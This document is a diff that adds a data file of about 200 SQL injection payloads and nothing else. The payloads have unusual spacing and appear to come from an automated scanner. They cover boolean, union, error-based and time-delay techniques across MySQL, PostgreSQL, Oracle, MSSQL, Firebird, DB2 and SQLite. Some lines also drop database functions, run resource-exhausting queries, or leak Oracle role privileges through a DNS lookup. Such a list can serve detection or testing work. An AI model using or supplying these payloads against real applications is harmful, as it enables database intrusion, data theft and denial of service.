@@ -1,0 +1,200 @@
+1'  )   and 5999  =  5879
+1"   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   "utlk" like "utlk
+1  )   where 5774  =  5774
+1"   )    )    and   (  3020  =  3020  )  *6703 and    (    (   "njdx" like "njdx
+1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--
+1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln
+1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  '
+-7726 or 3038  =  3038
+1' union all select null,null#
+1" and elt  (  1210  =  1210,sleep  (  5   )    )   
+-9975 where 9760  =  9760 order by 1--
+-6412%' or 4065  =  5815 and '%'  =  '
+-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874
+-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --
+1" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+iif  (  1157  =  4542,1,1/0  )  
+1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #
+1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --
+1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu
+-7371'  )   union all select 4531,4531,4531#
+-5116  )   or   (  8287  =  4930  )  *4930
+1',  (  case when 3598  =  2118 then 1 else null end  )  
+ select * from users where id  =  1 or "$_" or 1  =  1 -- 1
+1%" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'+  (  select iutk where 6158  =  6158
+-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '
+-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq
+1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle
+-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#
+1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'swfj' like 'swfj
+select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn
+1' where 6116  =  6116
+1 where 3354  =  3354
+1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf
+1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1'  )   as xhmm where 8092  =  8092 union all select null,null,null--
+-3084%'   )    )    order by 1--
+1'||  (  select 'mwpd' where 2887  =  2887
+-6595" order by 1--
+1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  
+-7320"  )   where 3907  =  3907 union all select 3907,3907--
+-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#
+-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--
+1"   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1' union all select null,null,null,null,null,null,null,null,null--
+1'||  (  select 'yezk' where 2097  =  2097
+ select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'
+select pg_sleep  (  5  )   and 'qfaz' like 'qfaz
+1"  )   where 2088  =  2088 union all select null,null,null,null--
+1"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "fkmh"  =  "fkmh
+-8358'   )    )     )   union all select 7282,7282--
+-7083 union all select 7705,7705,7705,7705,7705#
+-2983'  )   or 8571  =  8571--
+ select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'
+-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc
+1"   )    )    union all select null,null,null,null#
+1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198--
+1"  )   where 9447  =  9447
+1' rlike sleep  (  5  )   and 'cugs'  =  'cugs
+1   )    )     )   union all select null,null,null,null--
+-3634%'   )    )    or 2671  =  2434
+1"  )   as hsws where 6656  =  6656
+1"   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#
+1'||  (  select 'xhcr' from dual where 9279  =  9279
+select   (  case when   (  6969  =  5797  )   then 6969 else 6969*  (  select 6969 from information_schema.character_sets  )   end  )  #
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj
+1%'  )   union all select null,null,null,null,null,null,null,null--
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --
+select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1'
+ select * from users where id  =  '1' union select $*$,@@VERSION -- 1'
+1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+end and 'icny' like 'icny
+1%'  )   and sleep  (  5  )   and   (  '%'  =  '
+1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  
+1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--
+-3634%'   )    )    or 2671  =  2434
+1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#
+1%"   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   "%"  =  "
+1   )    )    as foul where 4361  =  4361 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --
+1%"   )    )     )   union all select null,null,null--
+1' where 7036  =  7036
+insert
+-1280'   )    )    or 8571  =  8571--
+ select * from users where id  =  1 or 1#". union select null,version  (    )   -- 1
+select   (  case when   (  3336  =  9781  )   then 3336 else 1/  (  select 0  )   end  )  --
+1'  )   and make_set  (  9961  =  6559,6559  )   and   (  'exde'  =  'exde
+1 waitfor delay '0:0:5'
+1'+  (  select 'iqxn' where 1146  =  1146 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'
+1'+  (  select 'sppw' where 1677  =  1677 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  '
+1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo
+1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq
+1"  )   union all select null,null--
+select * from users where id  =  '1' or $<\ or 1  =  1 -- 1'
+1  )   and 2006  =  2006
+select case when 1892  =  3646 then 1 else null end--
+-7627%"   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--
+-5066'   )    )    union all select 9689,9689,9689,9689#
+1 union all select null,null,null,null,null,null#
+1 where 9872  =  9872
+1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq
+1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --
+1 where 9872  =  9872
+1%'  )   and 4595  =  4595#
+1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+-3492" where 4094  =  4094 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --
+1"   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   "dbxi" like "dbxi
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  
+1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue
+ AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i
+1%"   )    )     )   and 9198  =  9198--
+ select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'
+1  )   and sleep  (  5  )   and   (  4855  =  4855
+1"  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  "ccuy"  =  "ccuy
+-9011"   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #
+hi' or 1  =  1 --
+ select * from users where id  =  1 *\ union select null,@@VERSION -- 1
+-4057'  )   order by 1#
+1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #
+-9532   )    )    union all select 6039,6039,6039,6039--
+1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --
+select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn
+1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%' union all select null,null,null,null,null,null,null,null--
+-9556 or   (  2049  =  6967  )  *6967# mhbc
+-2790"   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--
+1"   )    )    union all select null,null,null,null,null,null,null,null--
+1"  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  "mmgx" like "mmgx
+1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#
+-1879%'   )    )    or 3038  =  3038
+1%"   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 
+1'   )    )    as nhkp where 8030  =  8030
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'ggcm' like 'ggcm
+1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm
+select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy
+if  (  3490  =  4920  )   select 3490 else drop function hlzt--
+1"  )   where 2633  =  2633 union all select null,null,null,null#
+ end and "xlvn"  =  "xlvn
+1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --
+select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq
+1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --
+1' in boolean mode  )   and 4457  =  3885#
+-5245' or elt  (  1032  =  1032,3623  )   and 'qfvo'  =  'qfvo
+1"  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  "unuk"  =  "unuk
+1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1%"  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  "%"  =  "
+-7940'  )   union all select 6024--
+-9854%"   )    )     )   or 6455  =  3652
+-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --
+-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318
+iif  (  1157  =  4542,1,1/0  )  
+-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107
+select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #
+-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--
+1'   )    )    union all select null,null,null,null,null,null,null,null#
+-3794'  )   union all select 2485,2485,2485,2485,2485--
+1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --
+1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%"   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  "%"  =  "
+1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  
+iif  (  2452  =  8999,1,1/0  )  
+-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip
+1" where 9230  =  9230
+1'   )    )    as nhkp where 8030  =  8030
+1   )    )     )   union all select null,null,null,null,null,null,null,null--
+1%" union all select null,null,null#
+-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--
+-2722"  )   or 4907  =  8126#
+1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-1526"  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#
+1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#
+if  (  4135  =  2165  )   select 4135 else drop function otyy--
+select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg
+1 where 1015  =  1015
+1" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and "wtkx"  =  "wtkx
+iif  (  2869  =  9448,1,1/0  )  
+1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-5300' union all select 2750,2750,2750,2750,2750,2750--
+-4772   )    )     )   union all select 3879,3879,3879,3879,3879--
+1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888
+-5520"   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --
+  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   
+1' and sleep  (  5  ) 
+1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq
+-8143  )   union all select 3014--
+1" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   
+1%"   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   "%"  =  "
